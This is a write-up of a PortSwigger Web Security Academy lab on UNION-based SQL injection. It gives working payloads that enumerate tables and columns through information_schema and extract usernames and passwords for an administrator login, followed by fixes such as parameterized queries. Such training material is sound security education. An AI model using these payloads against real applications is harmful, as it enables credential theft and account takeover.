# SQL injection UNION attack, listing the database contents (non-Oracle)
---
## TARGET
PortSwigger Web Security Academy  
Lab: _SQL injection UNION attack, listing the database contents (non-Oracle)_

---
## DESCRIPTION
The application is vulnerable to SQL injection in the product category filter.  
Query results are returned in the response, allowing a UNION-based SQL injection to enumerate database contents.

---
## ROOT CAUSE
User input from the `category` parameter is directly concatenated into a SQL query.  
The application does not use prepared statements and reflects query results.

---
## ATTACK SCENARIO
1. The user filters products by category.
2. The backend executes a query similar to:
```SQL
SELECT name, description FROM products WHERE category = 'Gifts'
```
3. The attacker confirms two text columns using:
```SQL
' UNION SELECT 'abc','def'--
```
4. The attacker lists all tables in the database:
```SQL
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
5. The attacker identifies the table containing user credentials.
6. The attacker lists columns in the identified table:
```SQL
' UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name = 'users_abcdef'--
```
7. The attacker retrieves usernames and passwords:
```SQL
' UNION SELECT username_abcdef, password_abcdef
FROM users_abcdef--
```
8. The attacker logs in as the administrator using the extracted password.
---
## PROOF OF CONCEPT
### Injection Point
- Parameter: `category`
- Context: String

### Payload Used
`' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--`
### Result
The response displays usernames and passwords, allowing authentication as the administrator.

---
## IMPACT
An attacker can enumerate database structure and extract credentials.  
This leads to full account compromise.

---
## FIX / MITIGATION
- Use prepared statements / parameterized queries
- Avoid dynamic SQL construction with user input
- Restrict access to `information_schema`
- Do not return raw query results
---
## KEY LEARNING
- `information_schema` exposes database metadata
- UNION attacks can enumerate tables and columns
- Credential extraction enables full account takeover

---
